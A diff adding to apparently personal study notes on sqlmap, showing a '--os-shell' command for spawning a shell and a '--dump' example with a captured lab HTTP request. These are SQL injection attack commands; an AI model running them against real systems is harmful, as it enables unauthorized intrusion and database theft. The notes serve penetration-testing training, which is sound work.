@@ -27,3 +27,22 @@
 | `sqlmap -u "http://www.example.com/?id=1" --os-shell`        | Spawning an OS shell                                        |
 
 > similarly to the case with the '--data' option, within the saved request file, we can specify the parameter we want to inject in with an asterisk (*), such as `'/?id=*'`.
+
+example  
+`sqlmap -r req.txt --dump`
+```
+POST /case4.php HTTP/1.1
+Host: 83.136.252.57:58430
+User-Agent: Mozilla/5.0 (X11; Linux aarch64; rv:109.0) Gecko/20100101 Firefox/115.0
+Accept: */*
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Content-Type: application/json
+Content-Length: 8
+Origin: http://83.136.252.57:58430
+Connection: keep-alive
+Referer: http://83.136.252.57:58430/case4.php
+Cookie: PHPSESSID=um7bsgkffmbs7flglrd3s0tvu9
+
+{"id":1}
+```
